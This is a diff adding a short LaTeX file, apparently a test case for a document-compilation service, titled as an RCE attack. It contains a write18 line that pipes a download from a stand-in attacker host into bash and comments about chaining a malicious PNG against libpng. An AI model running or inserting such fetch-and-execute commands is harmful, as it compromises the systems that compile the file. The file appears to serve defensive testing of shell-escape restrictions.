@@ -1,0 +1,22 @@
+\documentclass{article}
+\usepackage{graphicx}
+
+\begin{document}
+
+\section*{Attack 3: Lateral Movement / Remote Code Execution (RCE)}
+
+Before modern versions of TeX, and without `-no-shell-escape`, this alone would compromise the container:
+\immediate\write18{curl -s http://attacker.domain/payload | bash}
+
+However, since `-no-shell-escape` blocks the above `write18`, a sophisticated attacker would instead chain this file with a malicious \texttt{malware-payload.png} they also upload. 
+
+Like so:
+
+% Imagine "malware-payload.png" contains a memory corruption exploit
+% for the libpng parser embedded within pdflatex. 
+% When pdflatex tries to render it, the exploit triggers, 
+% breaking out of the LaTeX parser boundaries and running shellcode.
+
+\includegraphics{malware-payload.png}
+
+\end{document}
